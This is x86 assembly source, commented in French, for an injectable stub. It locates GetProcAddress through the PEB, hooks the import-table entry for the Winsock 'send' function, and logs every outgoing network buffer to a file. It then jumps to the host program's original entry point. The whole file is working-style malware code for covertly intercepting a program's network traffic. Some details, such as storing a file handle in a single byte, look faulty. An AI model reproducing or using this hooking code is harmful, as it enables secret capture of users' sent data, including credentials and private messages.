.386
.model flat, stdcall


.code
assume fs:nothing

GetProc dd ?
WriteFi	dd ?
CreateFi dd ?
IAT_API dd ?
API dd ?
Name_DLL db "WS2_32.DLL",0h
Nom_Fonction db "send",0h
Nom_File db "hook.txt",0h
Nom_WriteFile db "WriteFile",0h
Nom_CreateFile db "CreateFileA",0h
Bytes dd ?
HandleFile db ?

; Technique de la team LSD modifiée

FindGetProcAddress:
		mov   	edx,fs:[30h]
		mov     eax,[edx + 0ch]
		mov     esi,[eax + 1Ch]
		mov     eax,[esi]
		mov     edx,[eax+8h]
		mov     [ebp-4h],edx
		mov     edx,[edx+3ch]
		add     edx,[ebp-4h]
		mov     edx,[edx+78h]
		add     edx,[ebp-4h]
		mov     [ebp-8h],edx
		xor     eax,eax
		add     edx,20h
		mov     edx,[edx]
		add     edx,[ebp-4h]
		mov     [ebp-18h],edx

Check_GetProcAddr:
		xor ecx,ecx
		mov ebx,[ebp-18h]
		mov ebx,[ebx]
		add ebx,[ebp-4h]
		cmp  dword ptr [ebx],'PteG' 
		jne Boucle
		cmp  dword ptr [ebx+4h],'Acor'
		jne Boucle
		jmp Check_GetProcAddr_Adress
Boucle:
		add word ptr [ebp-18h],4h
		add word ptr [ebp-14h],1h
		jmp Check_GetProcAddr

Check_GetProcAddr_Adress:
		mov ebx,[ebp-14h]
		imul ebx,4h
		mov [ebp-14h],ebx      
		mov ebx,[ebp-8h]
		add ebx,1ch
		mov ebx,[ebx]
		add ebx ,[ebp-4h]
		add ebx, [ebp-14h]
		mov ebx, [ebx]
		add ebx, [ebp-4h]
		mov [GetProc],ebx
		ret

Search_API:
		push ebp
		mov ebp,esp
		mov eax,[ebp+08h]
		push eax
		push dword ptr [ebp+20h]
		call dword ptr [GetProc]
		mov esp,ebp
		pop ebp
		ret 4

Start:
		push ebp
		mov ebp,esp
		push 0h
		push 0h
		push 0h
		push 0h
		push 0h
		push 0h
		call FindGetProcAddress
		push offset Nom_CreateFile
		call Search_API
		mov [CreateFi],eax
		push offset Nom_WriteFile
		call Search_API
		mov [WriteFi],eax
		mov eax, fs : [30h]
		mov ebx,[eax+08h]	
		mov eax,ebx		
		add eax, [ebx+3ch]	
		mov eax,[eax+80h]		
		add eax,ebx

Search_DLL:		;Merci a tolwin pour son paper :D
		lea esi, Name_DLL		
		mov edi, [eax+0ch]		
		and edi,edi			
		jz Run		
		add edi, ebx		
		mov ecx,0ah	
		repz cmpsb
		and ecx,ecx
		jnz Next_DLL
		mov cl,byte ptr [edi]
		and cl,cl
		jnz Next_DLL
		jmp Check_Fct

Next_DLL:
		add eax,14h		
		jmp Search_DLL

Check_Fct:					
		xor edx,edx
		push eax

		mov eax,[eax]
		add eax,ebx

Search_Fct:
		mov edi,[eax]
		and edi,edi
		jz Run	
		add edi,ebx
		add edi,02h
		lea esi,Nom_Fonction
		mov ecx,04h
		repz cmpsb
		and ecx,ecx
		jnz Next_Fct
		mov cl,byte ptr [edi]
		and cl,cl
		jnz Next_Fct
		jmp Check_Fct_Adress

Next_Fct:
		inc edx
		add eax,04h
		jmp Search_Fct

Check_Fct_Adress:
		pop eax
		mov eax,[eax+10h]
		add eax,ebx
		imul edx,4
		add eax,edx
Hooking:
		mov IAT_API,eax
		mov ebx,[eax]
		mov API,ebx
		mov [eax],Hook
		push 0
		push FILE_ATTRIBUTE_NORMAL
		push CREATE_ALWAYS
		push 0
		push 0
		push OPEN_ALWAYS
		push offset Nom_File
		call dword ptr [CreateFi]
		mov [HandleFile],al
Run:
		pop eax
		pop eax
		pop eax
		pop eax
		pop eax
		pop eax
		xor eax,eax
		mov eax,401000h //oep
		jmp eax
		
Hook:
		push ebp
		mov ebp,esp
		xor eax,eax
		mov al,byte ptr [HandleFile]
		mov ebx,[ebp+12]
		mov ecx,[ebp+16]
		push 0
		push offset Bytes
		push ecx
		push ebx
		push eax
		call dword ptr [WriteFi]
		
Jump:
		mov esp, ebp
		pop ebp
		jmp API

end Start
